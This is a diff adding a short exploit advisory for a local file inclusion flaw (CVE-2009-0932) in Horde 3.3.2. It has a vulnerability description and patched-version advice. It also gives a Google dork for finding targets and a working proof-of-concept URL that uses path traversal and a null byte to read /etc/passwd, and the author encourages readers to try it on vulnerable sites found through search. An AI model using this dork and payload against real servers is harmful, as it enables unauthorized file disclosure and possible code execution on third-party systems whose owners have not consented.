@@ -1,0 +1,39 @@
+# Exploit Title: Horde Horde_Image::factory driver Argument Local File
+Inclusion
+# Google Dork: intitle:horde
+# Date: 10-02-2011
+# Author: skysbsb
+# Software Link: http://www.horde.org/download/
+# Version: Horde 3.3.2
+# Tested on: linux
+# CVE : CVE-2009-0932
+
+The original disclosure was done by Gunnar Wrobel from Horde team.. it was
+found in a code audit (january 2009).
+It's an old vuln(2009) but still unpublished in exploit-db. There is a lot
+of vulnerables sites out there. Just try google =)
+
+
+Vuln description:
+The version of Horde, Horde Groupware, or Horde Groupware Webmail Edition
+installed on the remote host fails to filter input to the 'driver' argument
+of the  'Horde_Image::factory' method before using it to include PHP code in
+'lib/Horde/Image.php'.  Regardless of PHP's 'register_globals' and
+'magic_quotes_gpc' settings, an unauthenticated attacker can exploit this
+issue to view arbitrary files or possibly to execute arbitrary PHP code on
+the remote host, subject to the privileges of the web server user id.
+
+
+Fix:
+If using Horde, upgrade to version 3.3.3 / 3.2.4 or later. If using Horde
+Groupware, upgrade to version 1.2.2 / 1.1.5 or later. If using Horde
+Groupware Webmail Edition, upgrade to version 1.2.2/1.1.5 or later.
+
+
+PoC:
+http://www.vulnsite.com/horde/util/barcode.php
+?type=../../../../../../../../../../../etc/./passwd%00
+
+
+
+# skysbsb [*at*] gmail.com
